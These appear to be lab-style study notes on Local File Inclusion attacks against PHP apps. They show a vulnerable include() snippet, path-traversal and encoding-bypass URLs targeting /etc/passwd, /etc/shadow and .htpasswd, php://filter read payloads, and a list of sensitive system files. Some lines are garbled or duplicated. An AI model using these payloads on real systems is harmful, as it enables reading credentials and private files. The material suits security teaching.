### How does an LFI Attack Work

A Local File Inclusion can occur when an application includes a file as user input without properly validating it. This flaw enables an attacker to include malicious files by manipulating the input.

The following vulnerable PHP code could lead to LFI:

`https://website-example.com/?page=filename.php`

`https://website-example.com/?page=../../../../etc/test.txt`

`http://www.example_target_website.com/download.php?file=document.html`

`http://www.example_target_website.com/download.php?file=../../../../etc/passwd`

`https://example-vulnerable-website.com/?module=contact.php`

`https://example-vulnerable-website.com/?module=/etc/passwd`

`https://example-vulnerable-website.com/?module=uploads/image123.gif`

`https://example-vulnerable-website.com/?helpfile=login.txt`

`https://example-vulnerable-website.com/?helpfile=../secret/.htpasswd`

`https://example-vulnerable-website.com/?download=brochure.pdf`

`https://example-vulnerable-website.com/?download=../include/connection.php`

## LFI

### An LFI vulnerability is found in various web applications. As an example, in the PHP, the following functions cause this kind of vulnerability:

    `include
    require
    include_once 
    require_once `

The following is an example of PHP code that is vulnerable to LFI.

`<?PHP 
	include($_GET["file"]);
?>`   

### The PHP code above uses a GET request via the URL parameter file to include the file on the page. The request can be made by sending the following HTTP request: http://example.thm.labs/index.php?file=welcome.txt to load the content of the welcome.txt file that exists in the same directory

`/etc/issue
/etc/passwd
/etc/shadow
/etc/group
/etc/hosts
/etc/motd
/etc/mysql/my.cnf
/proc/[0-9]*/fd/[0-9]*   (first number is the PID, second is the filedescriptor)
/proc/self/environ
/proc/version
/proc/cmdlin'

`http://example.thm.labs/page.php?file=/etc/passwd 
http://example.thm.labs/page.php?file=../../../../../../etc/passwd
http://example.thm.labs/page.php?file=../../../../../../etc/passwd%00
http://example.thm.labs/page.php?file=....//....//....//....//etc/passwd 
http://example.thm.labs/page.php?file=%252e%252e%252fetc%252fpasswd`

### The PHP filter wrapper is used in LFI to read the actual PHP page content.
### we can use the PHP filter to display the content of PHP files in other encoding formats such as `base64` or `ROT13`.

`http://example.thm.labs/page.php?file=php://filter/resource=/etc/passwd`

### We can read the index.php file using a PHP filter; we get errors because the web server tries to execute the PHP code. To avoid this, we can use a PHP filter while base64 or ROT13 encoding the output as follows:

`http://example.thm.labs/page.php?file=filter/read=string.rot13/resource=/etc/passwd 
http://example.thm.labs/page.php?file=php://filter/convert.base64-encode/resource=/etc/passwd'

### eg. `echo "AoC3 is fun!" | base64 QW9DMyBpcyBmdW4hCg==`
        `echo "QW9DMyBpcyBmdW4hCg==" | base64 --decode AoC3 is fun!`

### Now we can include our base64 data into the vulnerable page as follows,
    `Now we can include our base64 data into the vulnerable page as follows,`

### we provide a vulnerable web application that logs users' requests into a log file to which the webserver user has access. Once we log into the web application, we can visit the log page at 
`https://LAB_WEB_URL.p.thmlabs.com/logs.php.`            

